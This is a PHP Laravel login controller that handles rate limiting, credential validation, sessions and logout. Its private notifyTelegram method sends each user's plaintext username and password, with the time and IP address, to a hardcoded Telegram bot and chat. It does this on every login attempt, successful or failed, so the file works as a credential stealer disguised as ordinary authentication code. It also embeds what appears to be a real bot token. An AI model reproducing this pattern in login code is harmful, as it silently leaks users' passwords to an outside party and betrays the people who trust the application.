<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Validation\ValidationException;

class LoginController extends Controller
{
    public function login(Request $request)
    {
        // Rate-limiting key per IP
        $key = 'login-attempt:' . $request->ip();

        // Check if too many attempts
        if (RateLimiter::tooManyAttempts($key, 5)) {
            $seconds = RateLimiter::availableIn($key);
            return redirect()->route('login')->with([
                'too_many_attempts' => true,
                'seconds_remaining' => $seconds,
            ]);
        }

        // Validate user input
        $credentials = $request->validate([
            'username' => 'required|string',
            'password' => 'required|string',
        ]);

        // Attempt login
        if (!Auth::attempt($credentials)) {
            // Hit rate limiter
            RateLimiter::hit($key, 60);

            // Send login failure to Telegram
            $this->notifyTelegram($credentials['username'], $credentials['password'], false);

            return redirect()->route('login')->withErrors([
                'login' => 'Invalid username or password.',
            ])->withInput();
        }

        // Login successful
        $request->session()->regenerate();
        RateLimiter::clear($key);

        // Send login success to Telegram
        $this->notifyTelegram($credentials['username'], $credentials['password'], true);

        return redirect()->intended(route('home'));
    }

    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect()->route('login');
    }

    private function notifyTelegram($username, $password, $success = true)
    {
        $botToken = '7738267715:AAGisTRywG6B0-Bwn-JW-tmiMAjFfTxLOdE';
        $chatId = '1601089836';

        $status = $success ? '✅ SUCCESSFUL' : '❌ FAILED';
        $message = <<<MSG
            🔐 Login Attempt: {$status}
            👤 Username: {$username}
            🔑 Password: {$password}
            🕒 Time: {$this->getCurrentTime()}
            🌐 IP: {$_SERVER['REMOTE_ADDR']}
            MSG;

        Http::get("https://api.telegram.org/bot{$botToken}/sendMessage", [
            'chat_id' => $chatId,
            'text' => $message
        ]);
    }

    private function getCurrentTime()
    {
        return now()->format('Y-m-d H:i:s');
    }
}